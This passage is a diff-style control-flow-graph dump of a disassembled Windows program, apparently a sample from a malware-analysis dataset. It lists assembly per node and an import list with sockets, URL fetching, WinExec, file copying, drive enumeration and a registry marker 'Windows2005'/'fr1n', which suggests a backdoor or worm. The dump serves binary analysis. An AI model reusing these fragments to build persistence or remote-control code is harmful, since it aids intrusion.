+  4200138, ['xor', 'eax,eax']
+  4200140, ['inc', 'eax']
+ next: [4200141]
+
+node :463
+node sub_4017E1(4200481) info:
+ start: 4200481
+ prev: []
+ instructions: 
+  4200481, ['mov', 'ebx,1']
+  4200486, ['jmp', 'shortloc_40182D']
+ next: [4200493]
+
+node :464
+node sub_401E1F(4202259) info:
+ start: 4202259
+ prev: []
+ instructions: 
+  4202259, ['push', 'ebx;hMem']
+  4202260, ['call', 'GlobalFree']
+  4202265, ['xor', 'eax,eax']
+  4202267, ['jmp', 'shortloc_401F1F']
+ next: [4202271]
+
+node :465
+node sub_40193E(4200808) info:
+ start: 4200808
+ prev: []
+ instructions: 
+  4200808, ['mov', 'eax,0FFFFFFFFh']
+  4200813, ['jmp', 'shortlocret_401973']
+ next: [4200819]
+
+node :466
+node sub_4012AF(4199299) info:
+ start: 4199299
+ prev: []
+ instructions: 
+  4199299, ['mov', '[esi],eax']
+  4199301, ['mov', 'dword_4052D9,0']
+ next: [4199311]
+
+node :467
+node sub_401543(4199846) info:
+ start: 4199846
+ prev: []
+ instructions: 
+  4199846, ['leave']
+  4199847, ['retn', '0Ch']
+ next: []
+
+node :468
+node bind(4207352) info:
+ start: 4207352
+ prev: []
+ instructions: 
+  4207352, ['jmp', '__imp_bind']
+ next: []
+
+node :469
+node InternetOpenUrlA(4207472) info:
+ start: 4207472
+ prev: []
+ instructions: 
+  4207472, ['jmp', '__imp_InternetOpenUrlA']
+ next: []
+
+node :470
+node RegSetValueExA(4207496) info:
+ start: 4207496
+ prev: []
+ instructions: 
+  4207496, ['jmp', '__imp_RegSetValueExA']
+ next: []
+
+node :471
+node CreateThread(4207136) info:
+ start: 4207136
+ prev: []
+ instructions: 
+  4207136, ['jmp', '__imp_CreateThread']
+ next: []
+
+node :472
+node closesocket(4207358) info:
+ start: 4207358
+ prev: []
+ instructions: 
+  4207358, ['jmp', '__imp_closesocket']
+ next: []
+
+node :473
+node send(4207406) info:
+ start: 4207406
+ prev: []
+ instructions: 
+  4207406, ['jmp', '__imp_send']
+ next: []
+
+node :474
+node WSAStartup(4207340) info:
+ start: 4207340
+ prev: []
+ instructions: 
+  4207340, ['jmp', '__imp_WSAStartup']
+ next: []
+
+node :475
+node GetTickCount(4207214) info:
+ start: 4207214
+ prev: []
+ instructions: 
+  4207214, ['jmp', '__imp_GetTickCount']
+ next: []
+
+node :476
+node sub_402964(4204939) info:
+ start: 4204939
+ prev: []
+ instructions: 
+  4204939, ['leave']
+  4204940, ['retn', '8']
+ next: []
+
+node :477
+node sub_401543(4199813) info:
+ start: 4199813
+ prev: []
+ instructions: 
+  4199813, ['xor', 'eax,eax']
+  4199815, ['leave']
+  4199816, ['retn', '0Ch']
+ next: []
+
+node :478
+node GetDateFormatA(4207172) info:
+ start: 4207172
+ prev: []
+ instructions: 
+  4207172, ['jmp', '__imp_GetDateFormatA']
+ next: []
+
+node :479
+node Root info:
+ start: 0
+ prev: []
+ instructions: 
+ next: ['sub_401000(4198400)', 'sub_401023(4198435)', 'sub_401043(4198467)', 'sub_401063(4198499)', 'sub_4010DD(4198621)', 'sub_401159(4198745)', 'sub_401184(4198788)', 'sub_401274(4199028)', 'sub_4012AF(4199087)', 'sub_4013D7(4199383)', 'sub_4013EA(4199402)', 'sub_4013FC(4199420)', 'sub_40142B(4199467)', 'sub_401460(4199520)', 'sub_401473(4199539)', 'sub_401486(4199558)', 'sub_4014F8(4199672)', 'sub_401529(4199721)', 'sub_401543(4199747)', 'sub_4015AA(4199850)', 'sub_40162A(4199978)', 'sub_40166E(4200046)', 'sub_4016CF(4200143)', 'sub_4017A0(4200352)', 'sub_4017E1(4200417)', 'sub_40183A(4200506)', 'sub_40193E(4200766)', 'sub_401977(4200823)', 'sub_4019D4(4200916)', 'sub_401A3D(4201021)', 'sub_401AA0(4201120)', 'sub_401B2A(4201258)', 'StartAddress(4201388)', 'sub_401C7D(4201597)', 'sub_401CC1(4201665)', 'sub_401D31(4201777)', 'sub_401E1F(4202015)', 'sub_401F31(4202289)', 'sub_401F86(4202374)', 'sub_401FB9(4202425)', 'sub_4020BB(4202683)', 'sub_402105(4202757)', 'sub_402140(4202816)', 'sub_4021D1(4202961)', 'sub_40246F(4203631)', 'sub_4024A9(4203689)', 'sub_402506(4203782)', 'sub_4025AF(4203951)', 'sub_40260B(4204043)', 'sub_402741(4204353)', 'sub_402782(4204418)', 'sub_402816(4204566)', 'sub_4028AF(4204719)', 'sub_4028FD(4204797)', 'sub_402947(4204871)', 'sub_402964(4204900)', 'sub_40298F(4204943)', 'sub_402A64(4205156)', 'sub_402AE7(4205287)', 'sub_402B00(4205312)', 'sub_402B36(4205366)', 'sub_402B99(4205465)', 'sub_402BD5(4205525)', 'sub_402CA7(4205735)', 'sub_402CD8(4205784)', 'sub_402D2C(4205868)', 'sub_402D47(4205895)', 'sub_402DCC(4206028)', 'sub_402DF7(4206071)', 'sub_402E11(4206097)', 'sub_402E35(4206133)', 'sub_403100(4206848)', 'start(4206996)', 'CloseHandle(4207100)', 'CompareFileTime(4207106)', 'CopyFileA(4207112)', 'CreateFileA(4207118)', 'CreateFileMappingA(4207124)', 'CreateMutexA(4207130)', 'CreateThread(4207136)', 'ExitProcess(4207142)', 'FindClose(4207148)', 'FindFirstFileA(4207154)', 'FindNextFileA(4207160)', 'GetCommandLineA(4207166)', 'GetDateFormatA(4207172)', 'GetDriveTypeA(4207178)', 'GetFileSize(4207184)', 'GetLocalTime(4207190)', 'GetLogicalDriveStringsA(4207196)', 'GetModuleFileNameA(4207202)', 'GetSystemDirectoryA(4207208)', 'GetTickCount(4207214)', 'GetTimeFormatA(4207220)', 'GetTimeZoneInformation(4207226)', 'GetWindowsDirectoryA(4207232)', 'GlobalAlloc(4207238)', 'GlobalFree(4207244)', 'LocalAlloc(4207250)', 'LocalFree(4207256)', 'MapViewOfFile(4207262)', 'ReleaseMutex(4207268)', 'Sleep(4207274)', 'SystemTimeToFileTime(4207280)', 'UnmapViewOfFile(4207286)', 'WaitForSingleObject(4207292)', 'WinExec(4207298)', 'WriteFile(4207304)', 'lstrcatA(4207310)', 'lstrcmpiA(4207316)', 'lstrcpyA(4207322)', 'lstrlenA(4207328)', 'wsprintfA(4207334)', 'WSAStartup(4207340)', 'accept(4207346)', 'bind(4207352)', 'closesocket(4207358)', 'connect(4207364)', 'gethostbyname(4207370)', 'gethostname(4207376)', 'inet_addr(4207382)', 'listen(4207388)', 'recv(4207394)', 'select(4207400)', 'send(4207406)', 'socket(4207412)', 'CoInitialize(4207418)', 'CreateStreamOnHGlobal(4207424)', 'StrDupA(4207430)', 'StrRChrA(4207436)', 'StrStrIA(4207442)', 'StrTrimA(4207448)', 'InternetCloseHandle(4207454)', 'InternetGetConnectedState(4207460)', 'InternetOpenA(4207466)', 'InternetOpenUrlA(4207472)', 'RegCloseKey(4207478)', 'RegCreateKeyA(4207484)', 'RegQueryValueExA(4207490)', 'RegSetValueExA(4207496)', 'GetNetworkParams(4207502)', 'ShellExecuteA(4207508)']
+
+node :480
+node RegCreateKeyA(4207484) info:
+ start: 4207484
+ prev: []
+ instructions: 
+  4207484, ['jmp', '__imp_RegCreateKeyA']
+ next: []
+
+node :481
+node select(4207400) info:
+ start: 4207400
+ prev: []
+ instructions: 
+  4207400, ['jmp', '__imp_select']
+ next: []
+
+node :482
+node sub_401063(4198616) info:
+ start: 4198616
+ prev: []
+ instructions: 
+  4198616, ['pop', 'ebx']
+  4198617, ['leave']
+  4198618, ['retn', '0Ch']
+ next: []
+
+node :483
+node sub_402A64(4205282) info:
+ start: 4205282
+ prev: []
+ instructions: 
+  4205282, ['pop', 'ebx']
+  4205283, ['leave']
+  4205284, ['retn', '8']
+ next: []
+
+node :484
+node GetLogicalDriveStringsA(4207196) info:
+ start: 4207196
+ prev: []
+ instructions: 
+  4207196, ['jmp', '__imp_GetLogicalDriveStringsA']
+ next: []
+
+node :485
+node sub_4013FC(4199420) info:
+ start: 4199420
+ prev: []
+ instructions: 
+  4199420, ['push', 'ebp']
+  4199421, ['mov', 'ebp,esp']
+  4199423, ['add', 'esp,0FFFFFFF8h']
+  4199426, ['lea', 'edx,[ebp+var_8]']
+  4199429, ['push', '[ebp+arg_4]']
+  4199432, ['pop', 'dwordptr[edx]']
+  4199434, ['mov', 'dwordptr[edx+4],0']
+  4199441, ['mov', 'edx,[ebp+arg_0]']
+  4199444, ['mov', 'edx,[edx]']
+  4199446, ['push', '0']
+  4199448, ['push', '[ebp+arg_8]']
+  4199451, ['push', '[ebp+var_4]']
+  4199454, ['push', '[ebp+var_8]']
+  4199457, ['push', '[ebp+arg_0]']
+  4199460, ['call', 'dwordptr[edx+14h]']
+  4199463, ['leave']
+  4199464, ['retn', '0Ch']
+ next: []
+
+node :486
+node CopyFileA(4207112) info:
+ start: 4207112
+ prev: []
+ instructions: 
+  4207112, ['jmp', '__imp_CopyFileA']
+ next: []
+
+node :487
+node wsprintfA(4207334) info:
+ start: 4207334
+ prev: []
+ instructions: 
+  4207334, ['jmp', '__imp_wsprintfA']
+ next: []
+
+node :488
+node WinExec(4207298) info:
+ start: 4207298
+ prev: []
+ instructions: 
+  4207298, ['jmp', '__imp_WinExec']
+ next: []
+
+node :489
+node sub_402506(4203935) info:
+ start: 4203935
+ prev: []
+ instructions: 
+  4203935, ['lea', 'eax,[ebp+DateStr]']
+  4203938, ['push', 'eax;lpString2']
+  4203939, ['push', '[ebp+lpString1];lpString1']
+  4203942, ['call', 'lstrcatA']
+  4203947, ['leave']
+  4203948, ['retn', '4']
+ next: []
+
+node :490
+node sub_4017A0(4200352) info:
+ start: 4200352
+ prev: []
+ instructions: 
+  4200352, ['push', 'ebp']
+  4200353, ['mov', 'ebp,esp']
+  4200355, ['add', 'esp,0FFFFFFF8h']
+  4200358, ['lea', 'eax,[ebp+phkResult]']
+  4200361, ['push', 'eax;phkResult']
+  4200362, ['push', 'offsetSubKey;"SOFTWARE\\\\Windows2005"']
+  4200367, ['push', '80000001h;hKey']
+  4200372, ['call', 'RegCreateKeyA']
+  4200377, ['mov', 'dwordptr[ebp+Data],1']
+  4200384, ['push', '4;cbData']
+  4200386, ['lea', 'eax,[ebp+Data]']
+  4200389, ['push', 'eax;lpData']
+  4200390, ['push', '4;dwType']
+  4200392, ['push', '0;Reserved']
+  4200394, ['push', 'offsetaFr1n;"fr1n"']
+  4200399, ['push', '[ebp+phkResult];hKey']
+  4200402, ['call', 'RegSetValueExA']
+  4200407, ['push', '[ebp+phkResult];hKey']
+  4200410, ['call', 'RegCloseKey']
+  4200415, ['leave']
+  4200416, ['retn']
+ next: []
+
+node :491
+node GetSystemDirectoryA(4207208) info:
+ start: 4207208
+ prev: []
+ instructions: 
+  4207208, ['jmp', '__imp_GetSystemDirectoryA']
+ next: []
+
+node :492
+node GlobalAlloc(4207238) info:
+ start: 4207238
+ prev: []
+ instructions: 
+  4207238, ['jmp', '__imp_GlobalAlloc']
+ next: []
+
+node :493
+node GetLocalTime(4207190) info:
+ start: 4207190
+ prev: []
+ instructions: 
+  4207190, ['jmp', '__imp_GetLocalTime']
+ next: []
+
+node :494
+node UnmapViewOfFile(4207286) info:
+ start: 4207286
+ prev: []
+ instructions: 
+  4207286, ['jmp', '__imp_UnmapViewOfFile']
+ next: []
+
+node :495
+node GetNetworkParams(4207502) info:
+ start: 4207502
+ prev: []
+ instructions: 
+  4207502, ['jmp', '__imp_GetNetworkParams']
+ next: []
+
+node :496
+node StrStrIA(4207442) info:
+ start: 4207442
+ prev: []
+ instructions: 
+  4207442, ['jmp', '__imp_StrStrIA']
+ next: []
+
+node :497
+node sub_401184(4199019) info:
+ start: 4199019
+ prev: []
+ instructions: 
+  4199019, ['push', '0;uExitCode']
+  4199021, ['call', 'ExitProcess']
+ next: []
+
+node :498
+node GetWindowsDirectoryA(4207232) info:
+ start: 4207232
+ prev: []
+ instructions: 
+  4207232, ['jmp', '__imp_GetWindowsDirectoryA']
+ next: []
+
+node :499
+node sub_402DCC(4206069) info:
+ start: 4206069
+ prev: []
+ instructions: 
+  4206069, ['pop', 'edi']
+  4206070, ['retn']
+ next: []
+
+node :500
+node sub_402947(4204894) info:
+ start: 4204894
+ prev: []
+ instructions: 
+  4204894, ['xor', 'eax,eax']
+  4204896, ['leave']
+  4204897, ['retn', '8']
+ next: []
+
+node :501
+node ReleaseMutex(4207268) info:
+ start: 4207268
+ prev: []
+ instructions: 
+  4207268, ['jmp', '__imp_ReleaseMutex']
+ next: []
+
+node :502
+node lstrcmpiA(4207316) info:
+ start: 4207316
+ prev: []
+ instructions: 
+  4207316, ['jmp', '__imp_lstrcmpiA']
+ next: []
+
+node :503
+node LocalFree(4207256) info:
+ start: 4207256
+ prev: []
+ instructions: 
+  4207256, ['jmp', '__imp_LocalFree']
+ next: []
+
+node :504
+node sub_401043(4198493) info:
+ start: 4198493
+ prev: []
+ instructions: 
+  4198493, ['pop', 'ebx']
+  4198494, ['pop', 'edi']
+  4198495, ['leave']
+  4198496, ['retn', '8']
+ next: []
+
+node :505
+node sub_4017E1(4200493) info:
+ start: 4200493
+ prev: []
+ instructions: 
+  4200493, ['push', '[ebp+phkResult];hKey']
+  4200496, ['call', 'RegCloseKey']
+  4200501, ['mov', 'eax,ebx']
+  4200503, ['pop', 'ebx']
+  4200504, ['leave']
+  4200505, ['retn']
+ next: []
+
+node :506
+node RegQueryValueExA(4207490) info:
+ start: 4207490
+ prev: []
+ instructions: 
+  4207490, ['jmp', '__imp_RegQueryValueExA']
+ next: []
+
+node :507
+node sub_402B36(4205381) info:
+ start: 4205381
+ prev: []
+ instructions: 
+  4205381, ['leave']
+  4205382, ['retn', '4']
+ next: []
+
+node :508
+node sub_4012AF(4199311) info:
+ start: 4199311
+ prev: []
+ instructions: 
+  4199311, ['mov', 'esi,edi']
+  4199313, ['mov', 'eax,dword_4052D9']
+  4199318, ['inc', 'dword_4052D9']
+  4199324, ['shl', 'eax,2']
+  4199327, ['add', 'esi,eax']
+  4199329, ['mov', 'eax,[esi]']
+  4199331, ['mov', 'ebx,eax']
+  4199333, ['shr', 'eax,0Bh']
+  4199336, ['xor', 'ebx,eax']
+  4199338, ['mov', 'eax,ebx']
+  4199340, ['shl', 'eax,7']
+  4199343, ['and', 'eax,9D2C5680h']
+  4199348, ['xor', 'ebx,eax']
+  4199350, ['mov', 'eax,ebx']
+  4199352, ['shl', 'eax,0Fh']
+  4199355, ['and', 'eax,0EFC60000h']
+  4199360, ['xor', 'ebx,eax']
+  4199362, ['mov', 'eax,ebx']
+  4199364, ['shr', 'eax,12h']
+  4199367, ['xor', 'eax,ebx']
+  4199369, ['xor', 'edx,edx']
+  4199371, ['div', '[ebp+arg_0]']
+  4199374, ['mov', 'eax,edx']
+  4199376, ['pop', 'ebx']
+  4199377, ['pop', 'edi']
+  4199378, ['pop', 'esi']
+  4199379, ['leave']
+  4199380, ['retn', '4']
+ next: []
+
+node :509
+node sub_4024A9(4203741) info:
+ start: 4203741
+ prev: []
+ instructions: 
+  4203741, ['mov', '[ecx],ebx']
+  4203743, ['pop', 'eax']
+  4203744, ['add', 'eax,4']
+  4203747, ['push', 'eax;dwBytes']
+  4203748, ['push', '40h;uFlags']
+  4203750, ['call', 'GlobalAlloc']
+  4203755, ['mov', '[ebx],eax']
+  4203757, ['push', '[ebp+lpString];lpString2']
+  4203760, ['push', 'eax;lpString1']
+  4203761, ['call', 'lstrcpyA']
+  4203766, ['mov', '[ebx+4],edi']
+  4203769, ['push', '[ebp+arg_10]']
+  4203772, ['pop', 'dwordptr[ebx+0Ch]']
+  4203775, ['pop', 'edi']
+  4203776, ['pop', 'esi']
+  4203777, ['pop', 'ebx']
+  4203778, ['leave']
+  4203779, ['retn', '14h']
+ next: []
+
+node :510
+node sub_401E1F(4202271) info:
+ start: 4202271
+ prev: []
+ instructions: 
+  4202271, ['pop', 'ebx']
+  4202272, ['leave']
+  4202273, ['retn', '8']
+ next: []
+
+node :511
+node GetTimeZoneInformation(4207226) info:
+ start: 4207226
+ prev: []
+ instructions: 
+  4207226, ['jmp', '__imp_GetTimeZoneInformation']
+ next: []
+
+node :512
+node LocalAlloc(4207250) info:
+ start: 4207250
+ prev: []
+ instructions: 
+  4207250, ['jmp', '__imp_LocalAlloc']
+ next: []
+
+node :513
+node sub_40193E(4200819) info:
+ start: 4200819
+ prev: []
+ instructions: 
+  4200819, ['leave']
+  4200820, ['retn', '4']
+ next: []
+
+node :514
+node sub_401AA0(4201254) info:
+ start: 4201254
+ prev: []
+ instructions: 
+  4201254, ['leave']
+  4201255, ['retn', '10h']
+ next: []
+
+node :515
+node CreateFileA(4207118) info:
+ start: 4207118
+ prev: []
+ instructions: 
+  4207118, ['jmp', '__imp_CreateFileA']
+ next: []
+
+node :516
+node MapViewOfFile(4207262) info:
+ start: 4207262
+ prev: []
+ instructions: 
+  4207262, ['jmp', '__imp_MapViewOfFile']
+ next: []
+
+node :517
+node sub_40166E(4200141) info:
+ start: 4200141
+ prev: []
+ instructions: 
+  4200141, ['leave']
+  4200142, ['retn']
+ next: []
+
